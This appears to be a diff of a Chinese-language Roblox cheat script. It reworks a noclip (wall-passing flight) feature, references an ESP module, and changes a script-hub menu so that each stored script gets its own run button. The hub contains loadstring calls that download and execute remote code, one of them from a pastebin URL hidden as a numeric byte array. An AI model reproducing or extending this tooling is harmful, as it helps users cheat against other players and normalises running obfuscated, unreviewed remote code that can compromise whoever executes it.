@@ -208,45 +208,42 @@ function NC:Enable()
  local ch=LP.Character if not ch then self.E=false print("[NC] no char") return end
  local hrp=ch:FindFirstChild("HumanoidRootPart") local hum=ch:FindFirstChild("Humanoid")
  if not hrp or not hum then self.E=false print("[NC] no hrp") return end
- self.OG=workspace.Gravity workspace.Gravity=0
- hum.PlatformStand=true hum.WalkSpeed=0 hum.JumpPower=0 hum.JumpHeight=0
- local bv=Instance.new("BodyVelocity") bv.Name="NCV" bv.Velocity=Vector3.new(0,0,0)
- bv.MaxForce=Vector3.new(math.huge,math.huge,math.huge) bv.P=100000 bv.Parent=hrp self.BV=bv
+ self.OWS=hum.WalkSpeed self.OJP=hum.JumpPower self.OJH=hum.JumpHeight
+ hum.WalkSpeed=self.S hum.JumpPower=0 hum.JumpHeight=0
  self.OC={}
  for _,p in ipairs(ch:GetDescendants()) do if p:IsA("BasePart") then self.OC[p]=p.CanCollide p.CanCollide=false end end
  self.D=ch.DescendantAdded:Connect(function(d) if d:IsA("BasePart") then self.OC[d]=d.CanCollide d.CanCollide=false end end)
  self.C=RS.RenderStepped:Connect(function()
   if not self.E then return end
-  cam=workspace.CurrentCamera or cam ch=LP.Character if not ch then return end
+  ch=LP.Character if not ch then return end
   hrp=ch:FindFirstChild("HumanoidRootPart") hum=ch:FindFirstChild("Humanoid")
   if not hrp or not hum then return end
-  hum.PlatformStand=true
-  local keys=UIS:GetKeysPressed() local f,bk,l,r,u,d=false,false,false,false,false,false
-  for _,k in ipairs(keys) do
-   if k.KeyCode==Enum.KeyCode.W then f=true end if k.KeyCode==Enum.KeyCode.S then bk=true end
-   if k.KeyCode==Enum.KeyCode.A then l=true end if k.KeyCode==Enum.KeyCode.D then r=true end
-   if k.KeyCode==Enum.KeyCode.Space then u=true end if k.KeyCode==Enum.KeyCode.LeftControl then d=true end
-  end
-  local cf=cam.CFrame local mv=Vector3.new(0,0,0)
-  if f then mv=mv+cf.LookVector end if bk then mv=mv-cf.LookVector end
-  if r then mv=mv+cf.RightVector end if l then mv=mv-cf.RightVector end
-  if u then mv=mv+Vector3.new(0,1,0) end if d then mv=mv-Vector3.new(0,1,0) end
-  if self.BV and self.BV.Parent then
-   self.BV.Velocity=mv.Magnitude>0 and mv.Unit*self.S or Vector3.new(0,0,0)
+  hum.WalkSpeed=self.S
+  local cf=workspace.CurrentCamera.CFrame
+  local mv=Vector3.new(0,0,0)
+  local mv2=hum.MoveDirection
+  if mv2.Magnitude>0 then mv=mv+mv2 end
+  if UIS:IsKeyDown(Enum.KeyCode.Space) then mv=mv+Vector3.new(0,1,0) end
+  if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then mv=mv-Vector3.new(0,1,0) end
+  if mv.Magnitude>0 then
+   hrp.Velocity=mv.Unit*self.S
+  else
+   hrp.Velocity=Vector3.new(0,0,0)
   end
   for _,p in ipairs(ch:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
  end)
- print("[穿墙] 已开启 (WASD移动,空格上升,Ctrl下降)")
+ print("[穿墙] 已开启 (方向键移动,空格上升,Ctrl下降)")
 end
 function NC:Disable()
  if not self.E then return end self.E=false
  if self.C then self.C:Disconnect() self.C=nil end
  if self.D then self.D:Disconnect() self.D=nil end
- if self.BV then self.BV:Destroy() self.BV=nil end
- if self.OG then workspace.Gravity=self.OG self.OG=nil end
  local ch=LP.Character
  if ch and self.OC then for p,o in pairs(self.OC) do if p and p.Parent then p.CanCollide=o end end end
- if ch then local h=ch:FindFirstChild("Humanoid") if h then h.PlatformStand=false h.WalkSpeed=16 h.JumpPower=50 h.JumpHeight=7.2 end end
+ if ch then
+  local h=ch:FindFirstChild("Humanoid")
+  if h then h.WalkSpeed=self.OWS or 16 h.JumpPower=self.OJP or 50 h.JumpHeight=self.OJH or 7.2 end
+ end
  self.OC={} print("[穿墙] 已关闭")
 end
 local ESP={E=false,SN=true,SD=true,SH=true,SB=true,TC=false,D={},C=nil}
@@ -2563,9 +2560,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/sharksharksharkshark/
 loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
 ]=]
 
-    local ZMSection = OT:AddSection("知名脚本集合")
     for sname, scontent in pairs(ZMScripts) do
-        ZMSection:AddButton("⭐  " .. sname, function()
+        local sec = OT:AddSection(sname)
+        sec:AddButton("⭐  运行" .. sname, function()
             print("[" .. sname .. "] 正在加载...")
             local ok, err = pcall(function() loadstring(scontent)() end)
             if ok then
